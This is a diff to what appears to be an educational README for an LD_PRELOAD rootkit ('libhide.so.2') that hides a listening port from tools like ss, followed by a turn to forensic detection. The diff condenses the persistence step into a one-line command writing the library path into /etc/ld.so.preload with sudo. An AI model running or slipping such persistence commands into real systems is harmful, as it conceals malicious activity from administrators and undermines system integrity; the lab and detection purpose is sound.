@@ -21,16 +21,9 @@ To test out functions, use the following (for example)
 ```
 LD_PRELOAD=./libhide.so.2 ss -tulpn | grep 8000
 ```
-To make it more permanent, do the following:
+To make it more permanent (write .so path to /etc/ld.so.preload), do the following:
 ```
-sudo cp libhide.so.2 /usr/local/lib
-```
-```
-sudo nano /etc/ld.so.preload
-```
-Enter the path to the shared library
-```
-/usr/local/lib/libhide.so.2
+echo "/usr/local/lib/libhide.so.2" | sudo tee /etc/ld.so.preload
 ```
 So then, with all the hiding information this rootkit does, how do we find it?<br>
 There are a couple simple forensic tools that we can use in order to determine what is going on here.<br>
